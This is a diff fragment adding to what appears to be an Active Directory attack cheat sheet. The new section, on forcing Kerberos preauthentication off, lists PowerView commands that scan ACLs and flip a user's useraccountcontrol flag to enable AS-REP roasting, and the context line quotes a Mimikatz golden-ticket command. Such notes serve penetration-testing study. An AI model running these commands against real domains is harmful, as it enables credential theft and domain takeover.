@@ -595,3 +595,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Get-DomainUser -PreauthNotRequired -Verbose`
 - Using ActiveDirectory module
   - `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
+
+**Force disable Kerberos Preauth**
+- Lets enumerate the permissions for RDPUsers on ACLs using PowerView
+  - `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
+  - `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
+  - `Get-DomainUser -PreauthNotRequired -Verbose` 
